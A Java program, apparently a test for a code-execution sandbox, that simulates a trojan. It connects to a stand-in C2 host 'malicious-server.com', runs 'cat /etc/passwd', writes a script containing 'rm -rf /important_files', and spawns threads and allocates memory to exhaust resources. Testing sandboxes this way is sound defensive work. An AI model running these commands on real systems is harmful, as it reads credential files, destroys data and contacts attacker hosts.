
import java.io.*;
import java.net.*;

/**
 * 模拟网络木马（会被沙箱网络限制）
 */
public class Main {

    public static void main(String[] args) {
        System.out.println("恶意程序启动...");
        
        // 1. 尝试连接外部 C2 服务器
        try {
            System.out.println("尝试连接命令控制服务器...");
            Socket socket = new Socket("malicious-server.com", 4444);
            System.out.println("连接成功！"); // 沙箱禁用网络，这里会失败
            socket.close();
        } catch (Exception e) {
            System.out.println("网络连接失败: " + e.getMessage());
        }
        
        // 2. 尝试执行系统命令
        try {
            System.out.println("尝试执行系统命令...");
            String[] cmds = {"/bin/sh", "-c", "cat /etc/passwd"};
            Process process = Runtime.getRuntime().exec(cmds);
            
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println("窃取数据: " + line);
            }
            process.waitFor();
        } catch (Exception e) {
            System.out.println("命令执行失败: " + e.getMessage());
        }
        
        // 3. 尝试写文件
        try {
            System.out.println("尝试写入文件...");
            FileWriter fw = new FileWriter("/tmp/evil_script.sh");
            fw.write("#!/bin/bash\n");
            fw.write("echo '恶意代码执行'\n");
            fw.write("rm -rf /important_files\n");
            fw.close();
            System.out.println("文件写入成功");
        } catch (Exception e) {
            System.out.println("文件写入失败: " + e.getMessage());
        }
        
        // 4. 尝试 Fork 炸弹（会被资源限制阻止）
        System.out.println("尝试启动 Fork 炸弹...");
        for (int i = 0; i < 100; i++) {
            new Thread(() -> {
                while (true) {
                    try {
                        Thread.sleep(100);
                    } catch (InterruptedException e) {}
                }
            }).start();
        }
        System.out.println("100个线程已启动");
        
        // 5. 尝试消耗内存
        System.out.println("尝试消耗内存...");
        try {
            byte[][] memoryHog = new byte[1000][];
            for (int i = 0; i < 1000; i++) {
                memoryHog[i] = new byte[1024 * 1024]; // 每次申请1MB
                System.out.println("已申请内存: " + (i + 1) + "MB");
                Thread.sleep(10);
            }
        } catch (Exception e) {
            System.out.println("内存申请失败: " + e.getMessage());
        }
        
        System.out.println("恶意程序执行完毕");
    }
}